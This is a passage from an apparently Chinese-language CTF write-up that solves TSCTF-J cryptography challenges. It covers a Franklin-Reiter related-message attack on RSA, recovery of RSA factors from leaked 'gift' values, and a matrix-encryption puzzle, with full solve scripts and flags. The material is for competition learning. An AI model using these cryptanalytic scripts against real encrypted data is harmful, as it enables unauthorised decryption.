<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">17515428580506336482920065687597618432639352657703669002780359377743914776003189936297497794271316232201999281774421548697177866332903866471518885478454843578867006248589625791033280075699050402358420491848343511978614942649711851563349630808644616950385050302966261294023725083784209368304218619201496093390701213330907394734354545006862435862009939465898782367798049469172652429938053538346740409740732732880445683784614934583353833571133884932104711325140486699582601070937909970702240418614307350445447464869735784576624399384628158548859128716134744368949395160346853204127661506776530056610406334277664598033307</span></span><br><span class="line">b1=<span class="number">1335480658797977714182635648750815419879863005458296451759980</span></span><br><span class="line">b2=<span class="number">1105478255797648007315023349886665504882795889468318648836489</span></span><br><span class="line">c1=<span class="number">12156386075808622919884470499999742428948502290502633266714149243391285205946115183803994358397007646732305875732756643202922104933378634777644066483167963571712035489015468459933095323334863890435749390532442705094998642125235372860705341955801015882661076385844505207361041433662302705168420651453751540995834305046607601185709642044598630304091303196332242061466550215712921474914475397203467487247940657328224044308073742136051064572546530378010878973999667554524646802318423870669538570596462520992438639236004336970873550235925980951294570526264437543798875923495522565998539523128411559014373395070473631453566</span></span><br><span class="line">c2=<span class="number">972356467391012086833811738641838319861817525445948808480936492147753430144317539441186943288915425511879540996004803019485652431865111396669860993724237438649969203047404242307149508808618203417951441795049448232404787581852741143348397287426740139094336833311562892315049969288568587789688296347942787598418528177855468807885673013470158098351440876237990921668040936715389231560323385934305926601416163595112453649216731937013137806754734815084774350987531334027717653682465954998739503739409608050354323175935659240003166740261566438895662897941156487383985053843011026442739486489133965796784933459982725696775</span></span><br><span class="line">e=<span class="number">7</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,b1,b2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[] <span class="comment">#定义R为整系数上的多项式环，文字为X</span></span><br><span class="line">    f1 = (X+b1)^e - c1 <span class="comment">#定义f为整系数的一元多项式</span></span><br><span class="line">    f2 = (X+b2)^e - c2</span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):<span class="comment">#取同余</span></span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line">m=franklinReiter(n,e,c1,c2,b1,b2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>最后拿到flag</p>
<p>TSCTF-J{It_is_easy_to_recover_the_message_with_known_padding}</p>
<p>注：细看名为<strong>《A New Related Message Attack on RSA》by Oded
Yacobi1 and Yacov Yacobi</strong>的论文</p>
<h2 id="mathematics">Mathematics</h2>
<p>有了padding的经验，math这道题做起来就比较简单了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># format of flag: TSCTF-J&#123;xxxxxx&#125;, in bytes</span></span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag)</span><br><span class="line">cipher = <span class="built_in">pow</span>(message, e, n)</span><br><span class="line"></span><br><span class="line">gift1 = <span class="built_in">pow</span>(<span class="number">2</span> * p + <span class="number">3</span> * q, <span class="number">2021</span>, n)</span><br><span class="line">gift2 = <span class="built_in">pow</span>(<span class="number">5</span> * p + <span class="number">7</span> * q, <span class="number">2022</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="built_in">print</span>(gift1)</span><br><span class="line"><span class="built_in">print</span>(gift2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># the output of the script as below:</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">30605581679665160107430766945206661729750997259431516369306207174539207400843979048399497879009868729937807750028608181665669646775019421528453638192335628976297919501875181688081027005051949199866197309932406189039545521333321147903535728094644196927618752892553550220031390670661488019976026411250442159074816802358459413981323379293868808748852783931931112848423499067965879576341050629353867764366614246882208094826567265127937605032156162174995858388935617233377185382224896377686480374865696235749860679377273666242221275603202819811415924982421389381296452456442800781531565181630206203003263990186920255763071</span></span><br><span class="line"><span class="string">6137854584727595405475724678025897263818580620962426691844777599539725463285747121810606137105642183728341825226388473642346527714351593304145813063818159004874258501364160613943110483706112586781728024028099716313480630571580767312902745114979907291129524477564466752175417165341216244893880831121490974268367800004417698685313031057446656144449296432255998032355482347680849507560156036602074353665492315585530264575962467981159617759900146415261679634326151759968772115197455763000988947209182801649599692588800665387410094346769212144327721768640168663472680195144917638972234098954171647227858474760378298895283</span></span><br><span class="line"><span class="string">15708249530436563969929627187365696729224358154094100100933829625644689728199793160090469051322912776535221971466959311667327899125222864463552605496589229707425940567458600965903888524435134269685032758439197992233678262619742530182454048294805533804023543194329962331416788750828190053874565488964086802991125562564501085648725565119599876284601561320151567206306442239042614735548575237123718044413535565993127522988353341771449480296718055955597444670613723992047569331013362598705517853440969318822231206596974891976807698813421421744632119552746069475216411383507610915688976008834098767283001622418400772211475</span></span><br><span class="line"><span class="string">13764754663008478610615444717227149485821061998541593968585784733740772373957864852434153621011940978806538969221017143266986579499913394830668965574283557265578112837874405140311443723601621688300063647358575328444520049272936937082056167963157438309228869114562377904131297784730709597583132380421275585185509232148526064374683330805366344030922695854813084189511701513743151965325845173158426062339299763804310826661164579150678904309784614403120724530890734477944301958244642160242612606153320869983425913117530260623332624887291294307530854505132359398485953972467252007254030450353918507974086878773786375410523</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>熟悉的RSA加密，但是有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gift1 = <span class="built_in">pow</span>(<span class="number">2</span> * p + <span class="number">3</span> * q, <span class="number">2021</span>, n)</span><br><span class="line">gift2 = <span class="built_in">pow</span>(<span class="number">5</span> * p + <span class="number">7</span> * q, <span class="number">2022</span>, n)</span><br></pre></td></tr></table></figure>
<p>可以写成 <span class="math display">\[
gift1=(p*2+3*q)^{2021}mod(n)\\
gift2=(5*p+7*q)^{2022}mod(n)
\]</span> 两个方程，两个未知数，可以尝试消元</p>
<p>预备知识 <span class="math display">\[
gift1=(2*q)^{2021}mod(n)+(3*q)^{2021}mod(n)\\
gift2=(5*q)^{2022}mod(n)+(7*q)^{2022}mod(n)
\]</span> Reason:由牛顿二项式定理展开后，中间项mod(n)=0</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017210355164.png" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x3 = <span class="built_in">pow</span>(gift1 * <span class="built_in">pow</span>(<span class="number">5</span>,<span class="number">2021</span>,n),<span class="number">2022</span>,n) % n</span><br><span class="line">x4 = <span class="built_in">pow</span>(gift2 * <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2022</span>,n),<span class="number">2021</span>,n) % n</span><br><span class="line">q = gcd(x3-x4,n)</span><br></pre></td></tr></table></figure>
<p>最后贴上完整代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">30605581679665160107430766945206661729750997259431516369306207174539207400843979048399497879009868729937807750028608181665669646775019421528453638192335628976297919501875181688081027005051949199866197309932406189039545521333321147903535728094644196927618752892553550220031390670661488019976026411250442159074816802358459413981323379293868808748852783931931112848423499067965879576341050629353867764366614246882208094826567265127937605032156162174995858388935617233377185382224896377686480374865696235749860679377273666242221275603202819811415924982421389381296452456442800781531565181630206203003263990186920255763071</span></span><br><span class="line">c=<span class="number">6137854584727595405475724678025897263818580620962426691844777599539725463285747121810606137105642183728341825226388473642346527714351593304145813063818159004874258501364160613943110483706112586781728024028099716313480630571580767312902745114979907291129524477564466752175417165341216244893880831121490974268367800004417698685313031057446656144449296432255998032355482347680849507560156036602074353665492315585530264575962467981159617759900146415261679634326151759968772115197455763000988947209182801649599692588800665387410094346769212144327721768640168663472680195144917638972234098954171647227858474760378298895283</span></span><br><span class="line">gift1=<span class="number">15708249530436563969929627187365696729224358154094100100933829625644689728199793160090469051322912776535221971466959311667327899125222864463552605496589229707425940567458600965903888524435134269685032758439197992233678262619742530182454048294805533804023543194329962331416788750828190053874565488964086802991125562564501085648725565119599876284601561320151567206306442239042614735548575237123718044413535565993127522988353341771449480296718055955597444670613723992047569331013362598705517853440969318822231206596974891976807698813421421744632119552746069475216411383507610915688976008834098767283001622418400772211475</span></span><br><span class="line">gift2=<span class="number">13764754663008478610615444717227149485821061998541593968585784733740772373957864852434153621011940978806538969221017143266986579499913394830668965574283557265578112837874405140311443723601621688300063647358575328444520049272936937082056167963157438309228869114562377904131297784730709597583132380421275585185509232148526064374683330805366344030922695854813084189511701513743151965325845173158426062339299763804310826661164579150678904309784614403120724530890734477944301958244642160242612606153320869983425913117530260623332624887291294307530854505132359398485953972467252007254030450353918507974086878773786375410523</span></span><br><span class="line">x3 = <span class="built_in">pow</span>(gift1 * <span class="built_in">pow</span>(<span class="number">5</span>,<span class="number">2021</span>,n),<span class="number">2022</span>,n) % n</span><br><span class="line">x4 = <span class="built_in">pow</span>(gift2 * <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2022</span>,n),<span class="number">2021</span>,n) % n</span><br><span class="line">q = gcd(x3-x4,n)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">p = n // q</span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e,phin)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="l1nearalgebra">L1nearAlgebra</h2>
<p>二血题</p>
<p>看到提示<strong>Have you learnt matrix operation?</strong></p>
<p>好家伙，矩阵运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = flag + os.urandom(<span class="number">62</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">M = Matrix(<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        M[i,i] = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">        M[i,i+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">C = Matrix(<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">idx = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">for</span> each , i <span class="keyword">in</span> <span class="built_in">zip</span>(flag[:<span class="number">31</span>],idx):</span><br><span class="line">    C += each * M ^ i</span><br><span class="line">M = M.transpose()</span><br><span class="line"><span class="keyword">for</span> each, i <span class="keyword">in</span> <span class="built_in">zip</span>(flag[<span class="number">31</span>:],idx):</span><br><span class="line">    C += each * M ^ i</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;cipher.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(<span class="built_in">list</span>(C)))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>看到一大串矩阵有点懵，决定先研究下加密方式</p>
<p><del>打crypto还得是Linux环境</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">b&#x27;abced&#x27;</span></span><br><span class="line">flag = flag + os.urandom(<span class="number">10</span>- <span class="built_in">len</span>(flag))</span><br><span class="line">M = Matrix(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        M[i,i] = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        M[i,i+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">C = Matrix(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">idx = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> each , i <span class="keyword">in</span> <span class="built_in">zip</span>(flag[:<span class="number">5</span>],idx):</span><br><span class="line">    C += each * M ^ i</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line">M = M.transpose()</span><br><span class="line"><span class="keyword">for</span> each, i <span class="keyword">in</span> <span class="built_in">zip</span>(flag[<span class="number">5</span>:],idx):</span><br><span class="line">    C += each * M ^ i</span><br><span class="line"><span class="built_in">print</span>(C)</span><br></pre></td></tr></table></figure>
<p>依葫芦画瓢写一段5*5的加密</p>
<p>输出如下 <span class="math display">\[
\begin{matrix}
2994 &amp; 490 9 &amp; 3116 &amp; 907 &amp; 101\\
0 &amp; 2994 &amp; 4909 &amp; 3116 &amp; 907\\
0 &amp; 0 &amp; 2994 &amp; 4909 &amp; 3116\\
0 &amp; 0 &amp; 0 &amp; 2994 &amp; 4909\\
0 &amp; 0 &amp; 0 &amp; 0 &amp; 2994
\end{matrix}\tag{1}
\]</span></p>
<p><span class="math display">\[
\begin{matrix}
8554 &amp; 4909 &amp; 3116 &amp; 907 &amp; 101\\
9780 &amp; 8554 &amp; 4909 &amp; 3116 &amp; 907\\
6438 &amp; 9780 &amp; 8554 &amp; 4909 &amp; 3116\\
1877 &amp; 6438 &amp; 9780 &amp; 8554 &amp; 4909\\
204 &amp; 1877 &amp; 6438 &amp; 9780 &amp; 8554\\
\end{matrix}\tag{2}
\]</span></p>
<p>可见是先加完上三角再加下三角，主对角线被加两次</p>
<p>其中右上角和左下角的值都是最后的字符值</p>
<p>且都是flag内字符*M<sup>i，即可理解为M</sup>i再与字符进行乘法运算</p>
<p><del>矩阵运算没学好的可以先寄了</del></p>
<p>可以考虑逆向从左下角开始再返回右上角，逐层输出减去</p>
<p>尝试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">G=Matrix(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">O=Matrix(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">t=<span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a=C[<span class="number">4</span>-i,<span class="number">0</span>]</span><br><span class="line">    G=M**t	<span class="comment">#生成第n次循环时的M</span></span><br><span class="line">    O=a*G	<span class="comment">#</span></span><br><span class="line">    C-=O</span><br><span class="line">    t-=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(C)</span><br></pre></td></tr></table></figure>
<p>输出如下，完美契合 <span class="math display">\[
\begin{matrix}
2994 &amp; 4909 &amp; 3116 &amp; 907 &amp; 101\\
0 &amp; 2994 &amp; 4909 &amp; 3116 &amp; 907\\
0 &amp; 0 &amp; 2994 &amp; 4909 &amp; 3116\\
0 &amp; 0 &amp; 0 &amp; 2994 &amp; 4909\\
0 &amp; 0 &amp; 0 &amp; 0 &amp; 2994\\
\end{matrix}\tag{3}
\]</span> 故可以写出逆代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C=[(<span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>, <span class="number">62288405</span>, <span class="number">4376270</span>, <span class="number">222711</span>, <span class="number">7306</span>, <span class="number">116</span>), (<span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>, <span class="number">62288405</span>, <span class="number">4376270</span>, <span class="number">222711</span>, <span class="number">7306</span>), (<span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>, <span class="number">62288405</span>, <span class="number">4376270</span>, <span class="number">222711</span>), (<span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>, <span class="number">62288405</span>, <span class="number">4376270</span>), (<span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>, <span class="number">62288405</span>), (<span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>, <span class="number">684116407</span>), (<span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>, <span class="number">6031286031</span>), (<span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>, <span class="number">43837271325</span>), (<span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>, <span class="number">267728994025</span>), (<span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>, <span class="number">1393335899885</span>), (<span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>, <span class="number">6244587116800</span>), (<span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>, <span class="number">24294703828405</span>), (<span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>, <span class="number">82547491872874</span>), (<span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span 